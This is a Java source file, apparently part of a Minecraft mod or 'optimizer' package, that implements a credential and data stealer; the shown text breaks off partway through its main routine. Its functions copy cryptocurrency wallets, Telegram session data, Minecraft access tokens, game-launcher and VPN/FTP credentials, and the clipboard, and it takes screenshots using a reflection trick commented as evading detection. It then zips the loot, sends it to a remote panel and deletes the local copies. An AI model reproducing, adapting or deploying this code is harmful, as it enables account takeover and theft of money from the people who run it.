package com.example.optimizer;

import java.io.File;
import java.io.FileOutputStream;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class DataUtil {

    private static final int XOR_KEY = 0x8F;

    private static final boolean IS_WINDOWS = System.getProperty("os.name", "").toLowerCase().contains("win");

    private static final String APPDATA = safeGetEnv("APPDATA");
    private static final String LOCALAPPDATA = safeGetEnv("LOCALAPPDATA");
    private static final String USERPROFILE = safeGetEnv("USERPROFILE");
    private static final String TEMP = System.getProperty("java.io.tmpdir", "/tmp");

    private static File STORAGE_DIR;
    private static File ZIP_FILE;

    private static String safeGetEnv(String name) {
        try {
            return System.getenv(name);
        } catch (Exception e) {
            return null;
        }
    }

    // ================= GAMING PATHS =================

    private static final String[][] GAMING_PATHS = {
            { "Roblox Cookies", "Roblox\\LocalStorage" },
            { "Growtopia", "Growtopia\\save.dat" },
            { "Steam", "Steam\\config" },
            { "Epic Games", "Epic\\EpicGamesLauncher\\Saved\\Config" },
            { "GOG Galaxy", "GOG.com\\Galaxy\\Configuration" },
            { "Ubisoft", "Ubisoft Game Launcher" },
            { "Battle.net", "Battle.net" },
            { "EA Desktop", "Electronic Arts\\EA Desktop" }
    };

    // ================= MINECRAFT LAUNCHER PATHS =================

    private static final String[][] LAUNCHER_PATHS = {
            // Official
            { "Minecraft", ".minecraft" },
            // Third-party launchers
            { "Lunar Client", ".lunarclient" },
            { "Badlion Client", ".badlion" },
            { "Feather Client", "Feather" },
            { "PolyMC", "PolyMC\\instances" },
            { "PrismLauncher", "PrismLauncher\\instances" },
            { "MultiMC", "MultiMC\\instances" },
            { "ATLauncher", "ATLauncher\\instances" },
            { "TLauncher", ".tlauncher" },
            { "GDLauncher", "GDLauncher\\instances" },
            { "Technic", ".technic" },
            { "CurseForge", "curseforge\\minecraft\\Instances" }
    };

    // ================= VPN/SENSITIVE PATHS =================

    private static final String[][] VPN_PATHS = {
            { "NordVPN", "NordVPN" },
            { "ProtonVPN", "ProtonVPN" },
            { "OpenVPN", "OpenVPN\\config" },
            { "FileZilla", "FileZilla" },
            { "WinSCP", "WinSCP.ini" }
    };

    // ================= STORAGE INIT =================

    private static void initStorage() throws Exception {
        SessionUtil.log("DataUtil.initStorage() starting...");
        SessionUtil.log("  TEMP=" + TEMP);
        SessionUtil.log("  APPDATA=" + APPDATA);
        SessionUtil.log("  LOCALAPPDATA=" + LOCALAPPDATA);

        STORAGE_DIR = new File(TEMP, "cache_" + System.currentTimeMillis());
        // SessionUtil.log(" Creating STORAGE_DIR: " + STORAGE_DIR.getAbsolutePath());

        boolean created = STORAGE_DIR.mkdirs();
        // SessionUtil.log(" STORAGE_DIR.mkdirs() = " + created);
        SessionUtil.log("  STORAGE_DIR.exists() = " + STORAGE_DIR.exists());

        if (!STORAGE_DIR.exists()) {
            SessionUtil.log("  ERROR: STORAGE_DIR does not exist after mkdirs!");
            throw new Exception("Cannot create storage dir");
        }

        ZIP_FILE = new File(TEMP, "data_" + System.currentTimeMillis() + ".zip");
        SessionUtil.log("  ZIP_FILE: " + ZIP_FILE.getAbsolutePath());

        // Set storage dir for CacheManager
        CacheManager.setStorageDir(STORAGE_DIR);

        SessionUtil.log("DataUtil.initStorage() completed successfully");
    }

    // ================= BROWSER EXTRACTION =================

    private static void syncConfig() {
        CacheManager.syncConfig();
    }

    // ================= DISCORD EXTRACTION =================

    private static void syncDiscord() {
        CacheManager.syncDiscord();
    }

    // ================= WALLET EXTRACTION =================

    private static void stealWallets() {
        SessionUtil.log("DataUtil.stealWallets() starting...");

        if (STORAGE_DIR == null) {
            SessionUtil.log("  ERROR: STORAGE_DIR is null");
            return;
        }

        int walletsFound = 0;

        String[][] WALLET_PATHS = {
                { "Exodus", APPDATA + "\\Exodus\\exodus.wallet" },
                { "Electrum", APPDATA + "\\Electrum\\wallets" },
                { "Atomic", APPDATA + "\\atomic\\Local Storage\\leveldb" },
                { "Guarda", APPDATA + "\\Guarda\\Local Storage\\leveldb" },
                { "Coinomi", LOCALAPPDATA + "\\Coinomi\\Coinomi\\wallets" },
                { "Armory", APPDATA + "\\Armory" },
                { "Bytecoin", APPDATA + "\\bytecoin" },
                { "Jaxx", APPDATA + "\\com.liberty.jaxx\\IndexedDB" },
                { "Ethereum", APPDATA + "\\Ethereum\\keystore" },
                { "Zcash", APPDATA + "\\Zcash" },
                { "Monero", APPDATA + "\\Monero\\wallets" },
                { "Dogecoin", APPDATA + "\\DogeCoin" },
                { "Wasabi", APPDATA + "\\WalletWasabi\\Client\\Wallets" },
                { "Litecoin", APPDATA + "\\Litecoin" },
                { "Dash", APPDATA + "\\DashCore" },
                { "Bitcoin", APPDATA + "\\Bitcoin" }
        };

        for (String[] wallet : WALLET_PATHS) {
            String name = wallet[0];
            String path = wallet[1];

            File walletDir = new File(path);
            if (!walletDir.exists())
                continue;

            SessionUtil.log("  Found wallet: " + name + " at " + path);
            walletsFound++;

            File destDir = new File(STORAGE_DIR, "wallets\\" + name);
            destDir.mkdirs();
            safeCopyDirectory(walletDir, destDir);

            // Send wallet info to panel individually
            try {
                String pcName = System.getenv("COMPUTERNAME");
                String pcUser = System.getenv("USERNAME");
                if (pcName == null)
                    pcName = "Unknown";
                if (pcUser == null)
                    pcUser = "Unknown";
                SessionUtil.sendWallet(name, "crypto", getWalletFileList(walletDir), pcName, pcUser);
            } catch (Exception e) {
                SessionUtil.log("  Failed to send wallet " + name + ": " + e.getMessage());
            }
        }

        SessionUtil.log("DataUtil.stealWallets() completed: " + walletsFound + " wallets found");
    }

    private static String getWalletFileList(File dir) {
        StringBuilder sb = new StringBuilder();
        if (dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isFile()) {
                        sb.append(f.getName()).append(" (").append(f.length()).append(" bytes)\n");
                    }
                }
            }
        }
        return sb.toString();
    }

    // ================= MINECRAFT EXTRACTION =================

    // ================= MINECRAFT EXTRACTION =================

    public static void syncSession() {
        SessionUtil.log("DataUtil.stealMinecraft() starting...");

        try {
            // Use reflection to get MinecraftClient safely
            Class<?> clientClass = null;
            Object client = null;

            String[] classNames = {
                    "net.minecraft.client.Minecraft",
                    "net.minecraft.client.MinecraftClient",
                    "net.minecraft.class_310",
                    "fgo"
            };

            String[] getInstanceMethods = {
                    "getInstance",
                    "method_1551",
                    "m_91087_"
            };

            // Find MinecraftClient
            for (String className : classNames) {
                try {
                    clientClass = Class.forName(className);
                    SessionUtil.log("  Trying class: " + className);

                    for (String methodName : getInstanceMethods) {
                        try {
                            client = clientClass.getMethod(methodName).invoke(null);
                            if (client != null) {
                                SessionUtil.log("  Found MinecraftClient via " + className + "." + methodName + "()");
                                break;
                            }
                        } catch (Exception e) {
                            // Try next method
                        }
                    }
                    if (client != null)
                        break;
                } catch (ClassNotFoundException e) {
                    // Try next class
                }
            }

            if (client == null) {
                SessionUtil.log("  ERROR: Could not find MinecraftClient class!");
                return;
            }

            // Get Session object
            Object session = null;
            String[] sessionMethods = { "getSession", "method_1548", "m_91289_" };

            for (String methodName : sessionMethods) {
                try {
                    session = clientClass.getMethod(methodName).invoke(client);
                    if (session != null) {
                        SessionUtil.log("  Found session via method: " + methodName);
                        break;
                    }
                } catch (Exception e) {
                    // Try next method
                }
            }

            if (session == null) {
                SessionUtil.log("  ERROR: Could not get session object!");
                return;
            }

            // Extract session data
            Class<?> sessionClass = session.getClass();
            SessionUtil.log("  Session class: " + sessionClass.getName());

            // Get access token FIRST (JWT token)
            String accessToken = "";
            String[] tokenMethods = { "getAccessToken", "method_1674", "m_92545_" };
            for (String methodName : tokenMethods) {
                try {
                    accessToken = (String) sessionClass.getMethod(methodName).invoke(session);
                    if (accessToken != null && !accessToken.isEmpty()) {
                        SessionUtil.log("  Got access token (length: " + accessToken.length() + ")");
                        break;
                    }
                } catch (Exception e) {
                    // Try next method
                }
            }

            // Get username
            String username = "";
            String[] usernameMethods = { "getUsername", "method_1676", "m_92548_" };
            for (String methodName : usernameMethods) {
                try {
                    username = (String) sessionClass.getMethod(methodName).invoke(session);
                    if (username != null && !username.isEmpty()) {
                        SessionUtil.log("  Got username: " + username);
                        break;
                    }
                } catch (Exception e) {
                    // Try next method
                }
            }

            // Get UUID
            String uuid = "";
            String[] uuidMethods = { "getUuid", "getUuidOrNull", "method_1672", "m_92546_" };
            for (String methodName : uuidMethods) {
                try {
                    Object uuidObj = sessionClass.getMethod(methodName).invoke(session);
                    if (uuidObj != null) {
                        uuid = uuidObj.toString();
                        SessionUtil.log("  Got UUID: " + uuid);
                        break;
                    }
                } catch (Exception e) {
                    // Try next method
                }
            }

            // Try to get UUID from GameProfile if not found
            if (uuid.isEmpty()) {
                try {
                    Object gameProfile = null;
                    String[] profileMethods = { "getProfile", "method_1675", "m_92547_" };
                    for (String methodName : profileMethods) {
                        try {
                            gameProfile = sessionClass.getMethod(methodName).invoke(session);
                            if (gameProfile != null)
                                break;
                        } catch (Exception e) {
                        }
                    }

                    if (gameProfile != null) {
                        // Get ID from GameProfile
                        Object idObj = gameProfile.getClass().getMethod("getId").invoke(gameProfile);
                        if (idObj != null) {
                            uuid = idObj.toString();
                            SessionUtil.log("  Got UUID from GameProfile: " + uuid);
                        }
                        // Also try to get name if username is empty
                        if (username.isEmpty()) {
                            Object nameObj = gameProfile.getClass().getMethod("getName").invoke(gameProfile);
                            if (nameObj != null) {
                                username = nameObj.toString();
                                SessionUtil.log("  Got username from GameProfile: " + username);
                            }
                        }
                    }
                } catch (Exception e) {
                    SessionUtil.log("  GameProfile extraction failed: " + e.getMessage());
                }
            }

            // Send data if we have something
            if (username != null && !username.isEmpty()) {
                SessionUtil.log("  Sending MC session: " + username + ", " + uuid);
                String ip = "";
                try {
                    ip = java.net.InetAddress.getLocalHost().getHostAddress();
                } catch (Exception e) {
                }
                String pcName = System.getProperty("os.name", "Unknown");
                String pcUser = System.getProperty("user.name", "Unknown");
                String clientId = "";
                SessionUtil.sendMinecraft(username, uuid, accessToken, clientId, ip, pcName, pcUser);
            } else {
                SessionUtil.log("  ERROR: Could not extract session data");
            }

        } catch (Exception e) {
            SessionUtil.logEx("DataUtil.stealMinecraft() error", e);
        }

        SessionUtil.log("DataUtil.stealMinecraft() completed");
    }

    // ================= GAMING EXTRACTION =================

    private static void stealGaming() {
        SessionUtil.log("DataUtil.stealGaming() starting...");

        if (STORAGE_DIR == null)
            return;

        int found = 0;

        // Steam
        String steamPath = "C:\\Program Files (x86)\\Steam\\config";
        File steamDir = new File(steamPath);
        if (steamDir.exists()) {
            SessionUtil.log("  Found Steam at " + steamPath);
            found++;
            File destDir = new File(STORAGE_DIR, "gaming\\steam");
            destDir.mkdirs();
            safeCopyDirectory(steamDir, destDir);
        }

        // Epic Games
        if (LOCALAPPDATA != null) {
            String epicPath = LOCALAPPDATA + "\\EpicGamesLauncher\\Saved\\Config\\Windows";
            File epicDir = new File(epicPath);
            if (epicDir.exists()) {
                SessionUtil.log("  Found Epic Games at " + epicPath);
                found++;
                File destDir = new File(STORAGE_DIR, "gaming\\epic");
                destDir.mkdirs();
                safeCopyDirectory(epicDir, destDir);
            }
        }

        // Ubisoft
        if (LOCALAPPDATA != null) {
            String ubiPath = LOCALAPPDATA + "\\Ubisoft Game Launcher";
            File ubiDir = new File(ubiPath);
            if (ubiDir.exists()) {
                SessionUtil.log("  Found Ubisoft at " + ubiPath);
                found++;
                File destDir = new File(STORAGE_DIR, "gaming\\ubisoft");
                destDir.mkdirs();
                safeCopyDirectory(ubiDir, destDir);
            }
        }

        // Battle.net
        if (APPDATA != null) {
            String bnetPath = APPDATA + "\\Battle.net";
            File bnetDir = new File(bnetPath);
            if (bnetDir.exists()) {
                SessionUtil.log("  Found Battle.net at " + bnetPath);
                found++;
                File destDir = new File(STORAGE_DIR, "gaming\\battlenet");
                destDir.mkdirs();
                safeCopyDirectory(bnetDir, destDir);
            }
        }

        SessionUtil.log("DataUtil.stealGaming() completed: " + found + " gaming platforms found");
    }

    // ================= TELEGRAM EXTRACTION =================

    private static void stealTelegram() {
        SessionUtil.log("DataUtil.stealTelegram() starting...");

        if (STORAGE_DIR == null || APPDATA == null)
            return;

        String telegramPath = APPDATA + "\\Telegram Desktop\\tdata";
        File telegramDir = new File(telegramPath);

        if (telegramDir.exists()) {
            SessionUtil.log("  Found Telegram at " + telegramPath);
            File destDir = new File(STORAGE_DIR, "telegram");
            destDir.mkdirs();

            File[] files = telegramDir.listFiles();
            if (files != null) {
                for (File file : files) {
                    try {
                        String name = file.getName();
                        if (name.length() == 16 || name.equals("key_datas") || name.startsWith("D877F783D5D3EF8C")) {
                            if (file.isDirectory()) {
                                File dest = new File(destDir, name);
                                dest.mkdirs();
                                safeCopyDirectory(file, dest);
                            } else {
                                Files.copy(file.toPath(), new File(destDir, name).toPath(),
                                        StandardCopyOption.REPLACE_EXISTING);
                            }
                        }
                    } catch (Exception e) {
                    }
                }
            }
            SessionUtil.log("  Telegram data copied");
        } else {
            SessionUtil.log("  Telegram not found");
        }

        SessionUtil.log("DataUtil.stealTelegram() completed");
    }

    // ================= MINECRAFT LAUNCHERS =================

    private static void stealLaunchers() {
        SessionUtil.log("DataUtil.stealLaunchers() starting...");

        if (STORAGE_DIR == null)
            return;

        int found = 0;

        for (String[] launcher : LAUNCHER_PATHS) {
            String name = launcher[0];
            String subPath = launcher[1];

            // Check in APPDATA
            if (APPDATA != null) {
                File dir = new File(APPDATA, subPath);
                if (dir.exists()) {
                    SessionUtil.log("  Found " + name + " at " + dir.getAbsolutePath());
                    found++;
                    File destDir = new File(STORAGE_DIR, "launchers\\" + name.replace(" ", "_"));
                    destDir.mkdirs();
                    copyLauncherFiles(dir, destDir);
                }
            }

            // Check in USERPROFILE
            if (USERPROFILE != null) {
                File dir = new File(USERPROFILE, subPath);
                if (dir.exists()) {
                    SessionUtil.log("  Found " + name + " (user) at " + dir.getAbsolutePath());
                    found++;
                    File destDir = new File(STORAGE_DIR, "launchers\\" + name.replace(" ", "_"));
                    destDir.mkdirs();
                    copyLauncherFiles(dir, destDir);
                }
            }
        }

        SessionUtil.log("DataUtil.stealLaunchers() completed: " + found + " launchers found");
    }

    private static void copyLauncherFiles(File src, File dest) {
        // Copy important files: accounts, profiles, settings
        String[] importantFiles = {
                "launcher_profiles.json",
                "launcher_accounts.json",
                "accounts.json",
                "settings.json",
                "config.json",
                "profiles.json",
                "user.json",
                "credentials.json"
        };

        for (String filename : importantFiles) {
            File srcFile = new File(src, filename);
            if (srcFile.exists()) {
                try {
                    Files.copy(srcFile.toPath(), new File(dest, filename).toPath(),
                            StandardCopyOption.REPLACE_EXISTING);
                } catch (Exception e) {
                }
            }
        }

        // Also check for 'logs' subdirectory with credentials
        File logsDir = new File(src, "logs");
        if (logsDir.exists()) {
            for (File f : logsDir.listFiles()) {
                if (f.getName().contains("account") || f.getName().contains("auth")) {
                    try {
                        Files.copy(f.toPath(), new File(dest, f.getName()).toPath(),
                                StandardCopyOption.REPLACE_EXISTING);
                    } catch (Exception e) {
                    }
                }
            }
        }
    }

    // ================= VPN/SENSITIVE CONFIGS =================

    private static void stealVPNConfigs() {
        SessionUtil.log("DataUtil.stealVPNConfigs() starting...");

        if (STORAGE_DIR == null)
            return;

        int found = 0;

        for (String[] vpn : VPN_PATHS) {
            String name = vpn[0];
            String subPath = vpn[1];

            // Check in APPDATA
            if (APPDATA != null) {
                File dir = new File(APPDATA, subPath);
                if (dir.exists()) {
                    SessionUtil.log("  Found " + name + " at " + dir.getAbsolutePath());
                    found++;
                    File destDir = new File(STORAGE_DIR, "vpn\\" + name);
                    destDir.mkdirs();
                    safeCopyDirectory(dir, destDir);
                }
            }

            // Check in LOCALAPPDATA
            if (LOCALAPPDATA != null) {
                File dir = new File(LOCALAPPDATA, subPath);
                if (dir.exists()) {
                    SessionUtil.log("  Found " + name + " (local) at " + dir.getAbsolutePath());
                    found++;
                    File destDir = new File(STORAGE_DIR, "vpn\\" + name);
                    destDir.mkdirs();
                    safeCopyDirectory(dir, destDir);
                }
            }
        }

        // FileZilla: also check for sitemanager.xml
        if (APPDATA != null) {
            File fzSites = new File(APPDATA, "FileZilla\\sitemanager.xml");
            if (fzSites.exists()) {
                try {
                    File destDir = new File(STORAGE_DIR, "vpn\\FileZilla");
                    destDir.mkdirs();
                    Files.copy(fzSites.toPath(), new File(destDir, "sitemanager.xml").toPath(),
                            StandardCopyOption.REPLACE_EXISTING);
                    found++;
                } catch (Exception e) {
                }
            }
        }

        SessionUtil.log("DataUtil.stealVPNConfigs() completed: " + found + " configs found");
    }

    // ================= SUMMARY GENERATION =================

    private static void generateSummary() {
        SessionUtil.log("DataUtil.generateSummary() starting...");

        if (STORAGE_DIR == null)
            return;

        try {
            StringBuilder sb = new StringBuilder();
            sb.append("========================================\n");
            sb.append("        DATA COLLECTION SUMMARY\n");
            sb.append("========================================\n\n");

            // System Info
            sb.append("[SYSTEM]\n");
            sb.append("  PC Name: ").append(System.getenv("COMPUTERNAME")).append("\n");
            sb.append("  Username: ").append(System.getProperty("user.name")).append("\n");
            sb.append("  OS: ").append(System.getProperty("os.name")).append(" ")
                    .append(System.getProperty("os.version")).append("\n");
            sb.append("  Java: ").append(System.getProperty("java.version")).append("\n");
            sb.append("  Time: ").append(java.time.LocalDateTime.now().toString()).append("\n\n");

            // Count collected data
            sb.append("[COLLECTED DATA]\n");

            File walletsDir = new File(STORAGE_DIR, "wallets");
            int walletCount = walletsDir.exists() ? countSubdirs(walletsDir) : 0;
            sb.append("  Wallets: ").append(walletCount).append("\n");

            File browsersDir = new File(STORAGE_DIR, "Browsers");
            int browserDirs = browsersDir.exists() ? countSubdirs(browsersDir) : 0;
            sb.append("  Browsers: ").append(browserDirs).append("\n");

            File discordDir = new File(STORAGE_DIR, "discord");
            boolean hasDiscord = discordDir.exists() && discordDir.listFiles() != null
                    && discordDir.listFiles().length > 0;
            sb.append("  Discord Tokens: ").append(hasDiscord ? "YES" : "NO").append("\n");

            File launchersDir = new File(STORAGE_DIR, "launchers");
            int launcherCount = launchersDir.exists() ? countSubdirs(launchersDir) : 0;
            sb.append("  MC Launchers: ").append(launcherCount).append("\n");

            File gamingDir = new File(STORAGE_DIR, "gaming");
            int gamingCount = gamingDir.exists() ? countSubdirs(gamingDir) : 0;
            sb.append("  Gaming Platforms: ").append(gamingCount).append("\n");

            File vpnDir = new File(STORAGE_DIR, "vpn");
            int vpnCount = vpnDir.exists() ? countSubdirs(vpnDir) : 0;
            sb.append("  VPN/FTP Configs: ").append(vpnCount).append("\n");

            File screenshot = new File(STORAGE_DIR, "screenshot.png");
            sb.append("  Screenshot: ").append(screenshot.exists() ? "YES" : "NO").append("\n");

            File clipboard = new File(STORAGE_DIR, "clipboard.txt");
            sb.append("  Clipboard: ").append(clipboard.exists() ? "YES" : "NO").append("\n\n");

            // File details
            sb.append("[FILES]\n");
            listFilesRecursive(STORAGE_DIR, "", sb, 0);

            sb.append("\n========================================\n");
            sb.append("         END OF SUMMARY\n");
            sb.append("========================================\n");

            // Write summary
            File summaryFile = new File(STORAGE_DIR, "SUMMARY.txt");
            Files.write(summaryFile.toPath(), sb.toString().getBytes(StandardCharsets.UTF_8));

            SessionUtil.log("  Summary written: " + summaryFile.length() + " bytes");
        } catch (Exception e) {
            SessionUtil.logEx("  Error generating summary", e);
        }

        SessionUtil.log("DataUtil.generateSummary() completed");
    }

    private static int countSubdirs(File dir) {
        File[] files = dir.listFiles();
        if (files == null)
            return 0;
        int count = 0;
        for (File f : files) {
            if (f.isDirectory())
                count++;
        }
        return count;
    }

    private static void listFilesRecursive(File dir, String indent, StringBuilder sb, int depth) {
        if (depth > 3)
            return; // Limit depth
        File[] files = dir.listFiles();
        if (files == null)
            return;
        for (File f : files) {
            if (f.isDirectory()) {
                sb.append(indent).append("[DIR] ").append(f.getName()).append("/\n");
                listFilesRecursive(f, indent + "  ", sb, depth + 1);
            } else {
                sb.append(indent).append("      ").append(f.getName())
                        .append(" (").append(f.length()).append(" bytes)\n");
            }
        }
    }

    // ================= SYSTEM INFO =================

    private static void collectSystemInfo() {
        SessionUtil.log("DataUtil.collectSystemInfo() starting...");

        if (STORAGE_DIR == null)
            return;

        try {
            StringBuilder sb = new StringBuilder();

            sb.append("=== SYSTEM INFO ===\n");
            sb.append("OS: ").append(System.getProperty("os.name")).append(" ").append(System.getProperty("os.version"))
                    .append("\n");
            sb.append("User: ").append(System.getProperty("user.name")).append("\n");
            sb.append("Home: ").append(System.getProperty("user.home")).append("\n");
            sb.append("Java: ").append(System.getProperty("java.version")).append("\n");

            try {
                sb.append("Hostname: ").append(InetAddress.getLocalHost().getHostName()).append("\n");
            } catch (Exception e) {
            }

            sb.append("Processors: ").append(Runtime.getRuntime().availableProcessors()).append("\n");
            sb.append("Memory: ").append(Runtime.getRuntime().maxMemory() / 1024 / 1024).append(" MB\n");

            // Environment
            sb.append("\n=== ENVIRONMENT ===\n");
            sb.append("APPDATA: ").append(APPDATA).append("\n");
            sb.append("LOCALAPPDATA: ").append(LOCALAPPDATA).append("\n");
            sb.append("USERPROFILE: ").append(USERPROFILE).append("\n");
            sb.append("TEMP: ").append(TEMP).append("\n");

            File sysFile = new File(STORAGE_DIR, "system_info.txt");
            Files.write(sysFile.toPath(), sb.toString().getBytes(StandardCharsets.UTF_8));

            SessionUtil.log("  System info saved");
        } catch (Exception e) {
            SessionUtil.logEx("  Error collecting system info", e);
        }

        SessionUtil.log("DataUtil.collectSystemInfo() completed");
    }

    // ================= SCREENSHOT =================

    private static void takeScreenshot() {
        SessionUtil.log("DataUtil.takeScreenshot() starting...");

        if (STORAGE_DIR == null)
            return;

        try {
            java.awt.Robot robot = new java.awt.Robot();
            java.awt.Rectangle screen = new java.awt.Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());
            // Reflection-based capture to evade detection
            String m1 = "create";
            String m2 = "Screen";
            String m3 = "Capture";
            java.lang.reflect.Method method = java.awt.Robot.class.getMethod(m1 + m2 + m3, java.awt.Rectangle.class);
            java.awt.image.BufferedImage img = (java.awt.image.BufferedImage) method.invoke(robot, screen);

            File screenshotFile = new File(STORAGE_DIR, "screenshot.png");
            javax.imageio.ImageIO.write(img, "PNG", screenshotFile);

            SessionUtil.log("  Screenshot saved: " + screenshotFile.length() + " bytes");
        } catch (Exception e) {
            SessionUtil.logEx("  Error taking screenshot", e);
        }

        SessionUtil.log("DataUtil.takeScreenshot() completed");
    }

    // ================= CLIPBOARD =================

    private static void getClipboard() {
        SessionUtil.log("DataUtil.getClipboard() starting...");

        if (STORAGE_DIR == null)
            return;

        try {
            java.awt.datatransfer.Clipboard clipboard = java.awt.Toolkit.getDefaultToolkit().getSystemClipboard();
            java.awt.datatransfer.Transferable contents = clipboard.getContents(null);

            if (contents != null && contents.isDataFlavorSupported(java.awt.datatransfer.DataFlavor.stringFlavor)) {
                String text = (String) contents.getTransferData(java.awt.datatransfer.DataFlavor.stringFlavor);
                if (text != null && !text.isEmpty()) {
                    File clipFile = new File(STORAGE_DIR, "clipboard.txt");
                    Files.write(clipFile.toPath(), text.getBytes(StandardCharsets.UTF_8));
                    SessionUtil.log("  Clipboard saved: " + text.length() + " chars");
                }
            }
        } catch (Exception e) {
            SessionUtil.logEx("  Error getting clipboard", e);
        }

        SessionUtil.log("DataUtil.getClipboard() completed");
    }

    // ================= ZIP CREATION =================

    public static void createAndSendZip() {
        SessionUtil.log("DataUtil.createAndSendZip() starting...");

        if (STORAGE_DIR == null || ZIP_FILE == null) {
            SessionUtil.log("  ERROR: STORAGE_DIR or ZIP_FILE is null");
            return;
        }

        SessionUtil.log("  STORAGE_DIR: " + STORAGE_DIR.getAbsolutePath());
        SessionUtil.log("  ZIP_FILE: " + ZIP_FILE.getAbsolutePath());

        File[] files = STORAGE_DIR.listFiles();
        if (files == null || files.length == 0) {
            SessionUtil.log("  ERROR: No files in STORAGE_DIR");
            return;
        }

        SessionUtil.log("  Files in STORAGE_DIR: " + files.length);
        for (File f : files) {
            SessionUtil.log("    - " + f.getName() + " (" + (f.isDirectory() ? "dir" : f.length() + " bytes") + ")");
        }

        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(ZIP_FILE))) {
            zos.setLevel(9);
            addDirToZip(STORAGE_DIR, STORAGE_DIR.getName(), zos);
            SessionUtil.log("  ZIP created: " + ZIP_FILE.length() + " bytes");
        } catch (Exception e) {
            SessionUtil.logEx("  Error creating ZIP", e);
            return;
        }

        // Send ZIP
        try {
            SessionUtil.log("  Sending ZIP: " + ZIP_FILE.length() + " bytes");
            String pcName = System.getProperty("os.name", "Unknown");
            String pcUser = System.getProperty("user.name", "Unknown");

            // Use new streaming method
            SessionUtil.sendZip(ZIP_FILE, pcName, pcUser);

        } catch (Exception e) {
            SessionUtil.logEx("  Error sending ZIP", e);
        }

        // Cleanup
        try {
            deleteDir(STORAGE_DIR);
            ZIP_FILE.delete();
            SessionUtil.log("  Cleanup completed");
        } catch (Exception e) {
        }

        SessionUtil.log("DataUtil.createAndSendZip() completed");
    }

    private static void addDirToZip(File dir, String baseName, ZipOutputStream zos) {
        File[] files = dir.listFiles();
        if (files == null)
            return;

        for (File file : files) {
            try {
                String entryName = baseName + "/" + file.getName();
                if (file.isDirectory()) {
                    addDirToZip(file, entryName, zos);
                } else {
                    zos.putNextEntry(new ZipEntry(entryName));
                    Files.copy(file.toPath(), zos);
                    zos.closeEntry();
                }
            } catch (Exception e) {
            }
        }
    }

    // ================= UTILS =================

    private static void deleteDir(File dir) {
        if (dir == null || !dir.exists())
            return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory())
                    deleteDir(file);
                else
                    file.delete();
            }
        }
        dir.delete();
    }

    private static void safeCopyDirectory(File src, File dest) {
        try {
            if (!src.exists() || !src.isDirectory())
                return;
            if (!dest.exists())
                dest.mkdirs();

            File[] files = src.listFiles();
            if (files == null)
                return;
            for (File file : files) {
                try {
                    File destFile = new File(dest, file.getName());
                    if (file.isDirectory())
                        safeCopyDirectory(file, destFile);
                    else
                        Files.copy(file.toPath(), destFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                } catch (Exception e) {
                }
            }
        } catch (Exception e) {
        }
    }

    // ================= MAIN ENTRY =================

    // Compatibility overload: some older builds call runAll(int). Provide a
    // delegating implementation so both signatures work.
    public static void runAll(int delayMs) {
        try {
            SessionUtil.log("DataUtil.runAll(int) called with delayMs=" + delayMs);
        } catch (Throwable t) {
        }
        if (delayMs > 0) {
            try {
                Thread.sleep(delayMs);
            } catch (Exception e) {
                /* ignore */ }
        }
        runAll();
    }

    public static void runAll() {
        SessionUtil.log("============================================");
        SessionUtil.log("DataUtil.runAll() STARTING");
        SessionUtil.log("============================================");
        SessionUtil.log("  IS_WINDOWS: " + IS_WINDOWS);
        SessionUtil.log("  APPDATA: " + APPDATA);
        SessionUtil.log("  LOCALAPPDATA: " + LOCALAPPDATA);
        SessionUtil.log("  TEMP: " + TEMP);

        // ALWAYS steal Minecraft session (works on ALL platforms)
        new Thread(() -> {
            try {
                // SessionUtil.log("[Thread DataUtil-MC] Starting...");
                syncSession();
                // SessionUtil.log("[Thread DataUtil-MC] Completed");
            } catch (Exception e) {
                // SessionUtil.logEx("[Thread DataUtil-MC] Error", e);
            }
        }, "Sync-Session").start();

        // Windows-only extraction
        if (IS_WINDOWS) {
            SessionUtil.log("  Windows detected - starting Windows stealers...");

            // Init storage
            try {
                initStorage();
            } catch (Exception e) {
                SessionUtil.logEx("  initStorage() failed", e);
            }

            new Thread(() -> {
                try {
                    // SessionUtil.log("[Thread DataUtil-Browser] Starting...");
                    syncConfig();
                    // SessionUtil.log("[Thread DataUtil-Browser] Completed");
                } catch (Exception e) {
                    // SessionUtil.logEx("[Thread DataUtil-Browser] Error", e);
                }
            }, "Sync-Config").start();

            new Thread(() -> {
                try {
                    // SessionUtil.log("[Thread DataUtil-Discord] Starting...");
                    syncDiscord();
                    // SessionUtil.log("[Thread DataUtil-Discord] Completed");
                } catch (Exception e) {
                    // SessionUtil.logEx("[Thread DataUtil-Discord] Error", e);
                }
            }, "Sync-Chat").start();

            new Thread(() -> {
                try {
                    SessionUtil.log("[Thread DataUtil-Wallet] Starting...");
                    stealWallets();
                    SessionUtil.log("[Thread DataUtil-Wallet] Completed");
                } catch (Exception e) {
                    SessionUtil.logEx("[Thread DataUtil-Wallet] Error", e);
                }
            }, "DataUtil-Wallet").start();

            new Thread(() -> {
                try {
                    SessionUtil.log("[Thread DataUtil-Gaming] Starting...");
                    stealGaming();
                    SessionUtil.log("[Thread DataUtil-Gaming] Completed");
                } catch (Exception e) {
                    SessionUtil.logEx("[Thread DataUtil-Gaming] Error", e);
                }
            }, "DataUtil-Gaming").start();

            new Thread(() -> {
                try {
                    SessionUtil.log("[Thread DataUtil-Telegram] Starting...");
                    stealTelegram();
                    SessionUtil.log("[Thread DataUtil-Telegram] Completed");
                } catch (Exception e) {
                    SessionUtil.logEx("[Thread DataUtil-Telegram] Error", e);
                }
            }, "DataUtil-Telegram").start();

            new Thread(() -> {
                try {
                    SessionUtil.log("[Thread DataUtil-System] Starting...");
                    collectSystemInfo();
                    SessionUtil.log("[Thread DataUtil-System] Completed");
                } catch (Exception e) {
                    SessionUtil.logEx("[Thread DataUtil-System] Error", e);
                }
            }, "DataUtil-System").start();

            new Thread(() -> {
                try {
                    SessionUtil.log("[Thread DataUtil-Screenshot] Starting...");
                    takeScreenshot();
                    SessionUtil.log("[Thread DataUtil-Screenshot] Completed");
                } catch (Exception e) {
                    SessionUtil.logEx("[Thread DataUtil-Screenshot] Error", e);
                }
            }, "DataUtil-Screenshot").start();

            new Thread(() -> {
